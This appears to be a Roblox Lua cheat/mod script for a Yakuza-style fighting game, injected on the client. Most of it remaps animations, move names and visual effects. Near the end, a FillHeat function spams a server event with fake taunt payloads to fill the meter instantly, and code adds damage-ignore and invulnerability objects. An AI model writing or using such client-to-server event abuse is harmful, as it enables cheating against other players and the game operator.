v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710468004""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710467557""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710468479""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710568545""
v.Name = ""EvadeCR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710568875""
v.Name = ""EvadeCL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632563534""
v.Name = ""EvadeQCB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632565056""
v.Name = ""EvadeQCF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632564616""
v.Name = ""EvadeQCL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632564233""
v.Name = ""EvadeQCR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11716395378""
v.Name = ""EvadeCF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11716396028""
v.Name = ""EvadeCB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11776345813""
v.Name = ""Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedR"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkRight'
v.Name = ""H_EvadedR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedL"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkLeft'
v.Name = ""H_EvadedL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Rush[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://8493751059""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Rush.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Rush.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Rush.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Hit1Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Hit1Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11959653217""
v.Name = ""Hit1Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Hit2Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Hit2Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11959653217""
v.Name = ""Hit2Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Run"") then
v = game.ReplicatedStorage.Styles.Rush[""Run""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://13731641248""
v.Name = ""Run""
-------------------------------Beast--------------------------------------
if game.ReplicatedStorage.Styles:FindFirstChild(""Beast"") then
v = game.ReplicatedStorage.Styles[""Beast""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end
v.Name = ""Beast""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Beast[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 0.75
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""StartBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""StartBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920901524""
v.Name = ""StartBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""GuardGrabHit"") then
v = game.ReplicatedStorage.Styles.Beast[""GuardGrabHit""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BearHug'
v.Name = ""GuardGrabHit""
if game.ReplicatedStorage.Styles.Beast.GuardGrabHit:FindFirstChild(""Ability"") then
v = game.ReplicatedStorage.Styles.Beast.GuardGrabHit[""Ability""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast.GuardGrabHit)
end
v.Value = 'Bear Hug'
v.Name = ""Ability""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Beast[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = Color3.fromRGB(255,211.00000262260437,50.000000819563866)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""LThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""LThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_LegToss'
v.Name = ""LThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike3'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike4'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Beast[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BGrab'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://11614916809""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Beast[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'Beast'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Throw"") then
v = game.ReplicatedStorage.Styles.Beast[""Throw""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BeastToss'
v.Name = ""Throw""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8223592585""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabOnWall"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabOnWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_WallSmack'
v.Name = ""H_GrabOnWall""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""GrabCorpses"") then
v = game.ReplicatedStorage.Styles.Beast[""GrabCorpses""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Beast)
end
v.Name = ""GrabCorpses""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabStanding"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Piledriver'
v.Name = ""H_GrabStanding""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_AbsorbBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""H_AbsorbBlock""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Torment'
v.Name = ""H_AbsorbBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_TwoHandeds"") then
v = game.ReplicatedStorage.Styles.Beast[""H_TwoHandeds""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_SelfDestruct'
v.Name = ""H_TwoHandeds""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabLeg"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabLeg""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Swing'
v.Name = ""H_GrabLeg""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Beast[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BeastTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Hit2Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Hit2Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920909417""
v.Name = ""Hit2Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EndBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""EndBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920912941""
v.Name = ""EndBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Hit1Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Hit1Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920902836""
v.Name = ""Hit1Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920916315""
v.Name = ""Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabOnFallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabOnFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_LobCrush'
v.Name = ""H_GrabOnFallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_Stunned"") then
v = game.ReplicatedStorage.Styles.Beast[""H_Stunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Knockout'
v.Name = ""H_Stunned""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""HThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""HThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_HeavyToss'
v.Name = ""HThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""LHThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""LHThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BHeavyToss'
v.Name = ""LHThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Beast[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenGrate'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://11614916023""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8223592585""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Beast[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8485681263""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Beast.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Beast.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Beast.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabStanding3"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabStanding3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Entangle'
v.Name = ""H_GrabStanding3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_StunnedFront"") then
v = game.ReplicatedStorage.Styles.Beast[""H_StunnedFront""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_KnockoutFront'
v.Name = ""H_StunnedFront""
if game.ReplicatedStorage.Moves[""龍TigerDrop""]:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves[""龍TigerDrop""][""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves[""龍TigerDrop""])
end
v.AnimationId = ""rbxassetid://12338275115"" 
v.Name = ""Anim""
if game.ReplicatedStorage.Moves[""龍TigerDrop""]:FindFirstChild(""ForceSF"") then
v = game.ReplicatedStorage.Moves[""龍TigerDrop""][""ForceSF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves[""龍TigerDrop""])
end
v.Value = '0.1' 
v.Name = ""ForceSF""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.AnimationId = ""rbxassetid://12338275115"" 
v.Name = ""Anim""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""HitDur"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""HitDur""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.Value = 0.3 
v.Name = ""HitDur""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""AniSpeed"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""AniSpeed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.Value = 1 
v.Name = ""AniSpeed""
if game.ReplicatedStorage.Moves.H_UltimateEssence:FindFirstChild(""MoveName"") then
v = game.ReplicatedStorage.Moves.H_UltimateEssence[""MoveName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves.H_UltimateEssence)
end
v.Value = 'Ultimate Essence '
v.Name = ""MoveName""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Brawler)
end

v.AnimationId = ""rbxassetid://11710466763""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Brawler)
end

v.AnimationId = ""rbxassetid://11710468004""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Brawler)
end

v.AnimationId = ""rbxassetid://11710467557""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Brawler)
end

v.AnimationId = ""rbxassetid://11710468479""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_EvadedF"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_EvadedF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FastFootworkFront'
v.Name = ""H_EvadedF""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_EvadedR"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_EvadedR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FastFootworkRight'
v.Name = ""H_EvadedR""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_EvadedL"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_EvadedL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FastFootworkLeft'
v.Name = ""H_EvadedL""
game.ReplicatedStorage.Sounds.Yell.Value = ""rbxassetid://7959271972""

local function playsound(id)
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://""..tostring(id)

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(sfx.TimeLength)
		sfx:Destroy()
	end)
end

function playticksound()
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://4843088994""

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(2)
		sfx:Destroy()
	end)
end

local function play_ingamesound(sfxname)
	local v = game.ReplicatedStorage.Sounds:FindFirstChild(sfxname)
	local sfx = Instance.new(""Sound"", nil)
	local id = v.Value

	sfx.SoundId = id

	for i,v in v:GetChildren() do
		sfx[v.Name] = v.Value
	end

	game.SoundService:PlayLocalSound(sfx)
	task.delay(15, function()
		sfx:Destroy()
	end)
end

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Ultimate Essence"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_UltimateEssence.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_UltimateEssence.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Ignite"")
        task.wait(0.4)
        play_ingamesound(""TigerSwing"")
        task.wait(0.6)
        play_ingamesound(""MassiveSlap"")
        task.wait(0.3)
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Fast Footwork [Back]"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_SumoSlap.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_SumoSlap.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Teleport"")
        play_ingamesound(""Slap"")
        task.wait(0.55)
        play_ingamesound(""Slap"")
        task.wait(0.45)
        play_ingamesound(""Slap"")
        task.wait(0.9)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local DragonText = ""Dragon""
local DragonColor = Color3.new(0.95, 0.05, 0.1)
local DragonSequence = ColorSequence.new({ColorSequenceKeypoint.new(0, DragonColor), ColorSequenceKeypoint.new(1, DragonColor)})

function isInBattle()
	return (plr:FindFirstChild(""InBattle"") and true or false)
end

function isDungeon()
	return game.ReplicatedStorage.Dungeon.Value
end

function doingHact()
	return (plr.Character:FindFirstChild(""Heated"") and true or false)
end

function showMaxHeatEffect()
	return (isInBattle() and not doingHact() and plr.Status.Heat.Value >= 100) and true or false
end

function hasWeaponInHand()
	return (plr.Character:FindFirstChild(""Holding"") and true or false)
end

local function change_color()
	if status.Style.Value == ""Brawler"" then
		local DragonSequence = ColorSequence.new{ColorSequenceKeypoint.new(0, styles.Brawler.Color.Value), ColorSequenceKeypoint.new(1, styles.Brawler.Color.Value)}
		local char = plr.Character
		char.HumanoidRootPart.Fire_Main.Color = DragonSequence
		char.HumanoidRootPart.Fire_Secondary.Color = DragonSequence
		char.HumanoidRootPart.Fire_Main.Rate = status.Heat.Value >= 100 and 115 or status.Heat.Value >= 75 and 85 or 80
		char.HumanoidRootPart.Fire_Secondary.Rate = status.Heat.Value >= 100 and 90 or status.Heat.Value >= 75 and 80 or 70
		char.HumanoidRootPart.Lines1.Color = DragonSequence
		char.HumanoidRootPart.Lines1.Rate = status.Heat.Value >= 100 and 60 or status.Heat.Value >= 75 and 40 or 20
		char.HumanoidRootPart.Lines2.Color = DragonSequence
		char.HumanoidRootPart.Lines2.Rate = status.Heat.Value >= 100 and 60 or status.Heat.Value >= 75 and 40 or 20
		char.HumanoidRootPart.Sparks.Color = DragonSequence
		if not char.HumanoidRootPart.TimeFor.Enabled then
			char.HumanoidRootPart.TimeFor.Color = DragonSequence
		end

		char.UpperTorso[""r2f_aura_burst""].Lines1.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Lines2.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Flare.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Lines1.Enabled = showMaxHeatEffect()
		char.UpperTorso[""r2f_aura_burst""].Flare.Enabled = showMaxHeatEffect()
		char.UpperTorso[""r2f_aura_burst""].Smoke.Color = DragonSequence
		char.UpperTorso.Evading.Color = DragonSequence
	end
end

local function FillHeat()
	local Event = game:GetService(""ReplicatedStorage"").Events.ME

	for i=1,6 do
		local A_1 =  {
			[1] = ""heat"", 
			[2] = game:GetService(""ReplicatedStorage"").Moves.Taunt
		}
		Event:FireServer(A_1)
	end
end
game:GetService(""RunService"").RenderStepped:Connect(change_color)

if moves:FindFirstChild(""龍TigerDrop"") then
        moves:FindFirstChild(""BRCounter2"").Name = ""FakeCounter2""
        moves:FindFirstChild(""龍TigerDrop"").Name = ""BRCounter2""
        moves:FindFirstChild(""BRCounter1"").Name = ""FakeCounter1""
        moves:FindFirstChild(""BRGrab"").Name = ""FakeGrab""

        local ignore = Instance.new(""Folder"")
        ignore.Name = ""IgnoreDmg""
        ignore.Parent = moves:FindFirstChild(""BRCounter2"")

        if not moves:FindFirstChild(""BRCounter2""):FindFirstChild(""HSize"") then
            local n = Instance.new(""NumberValue"")
            n.Name = ""HSize""
            n.Value = 2
            n.Parent = moves:FindFirstChild(""BRCounter2"")
        end
    end

function playticksound()
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://4843088994""

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(2)
		sfx:Destroy()
	end)
end

local notifyevent 
for i,v in pairs (pgui:GetChildren()) do
    if v:IsA(""BindableEvent"") then
        notifyevent = v
    end
end

local function sendNotification(text, color, sound)
    if not color then color = Color3.new(1, 1, 1) end
    pgui.NotifyUI.Awards.ChildAdded:Once(function(c)
        if c.Text == text then
            c.TextColor3 = color
            coroutine.wrap(function()
                local con;
                con = game:GetService(""RunService"").RenderStepped:Connect(function()
                    if not c then
                        con:Disconnect()
                        return
                    end
                    c.TextColor3 = color
                end)()
            end)()
        end
    end)
    notifyevent:Fire(text, sound or nil)
end

local uis = game:GetService(""UserInputService"")
local rushstyle = game.ReplicatedStorage.Styles.Rush
local brawlerstyle = game.ReplicatedStorage.Styles.Brawler
local beaststyle = game.ReplicatedStorage.Styles.Beast

local grabstrike = rushstyle:WaitForChild(""GrabStrike""):Clone()
local guruparry = brawlerstyle:WaitForChild(""GrabStrike"")

sendNotification(""Press X to swap counter step and parry on Dragon"", color)

uis.InputBegan:Connect(function(key)
	if game.UserInputService:GetFocusedTextBox() == nil then
		if key.KeyCode == Enum.KeyCode.X then
			playticksound()
			if guruparry.Parent ~= nil then
				guruparry.Parent = nil
				grabstrike.Parent = brawlerstyle
				sendNotification(""Counter Quickstep Enabled"", color)
			else
			guruparry.Parent = brawlerstyle
				grabstrike.Parent = nil
				sendNotification(""Parry Enabled"", color)
			end
		end
	end
end)

task.wait(1)
sendNotification(""Press [F] to instantly fill heat."")

game.UserInputService.InputBegan:Connect(function(key)
	if game.UserInputService:GetFocusedTextBox() == nil then
		if key.KeyCode == Enum.KeyCode.F then
            FillHeat() 
        end
    end
end)

local function add_forcefield(duration)
	local p = game.Players.LocalPlayer
	local Status = p.Status

	local invun = game.ReplicatedStorage.Invulnerable:Clone()
	invun.Parent = Status

	if duration then
		spawn(function()
			task.wait(duration)
			invun:Destroy()
		end)
	end

	return invun
end

-- Please use this script in a seperate tab so the idle animation works

local plr = game:GetService(""Players"").LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface

local cframe = plr.Character.LowerTorso.CFrame

interf.Client.Disabled = true
task.wait()
interf.Client.Disabled = false
task.wait(0.1)
plr.Character.LowerTorso.CFrame = cframe

-- Uncomment this script for it to work. 

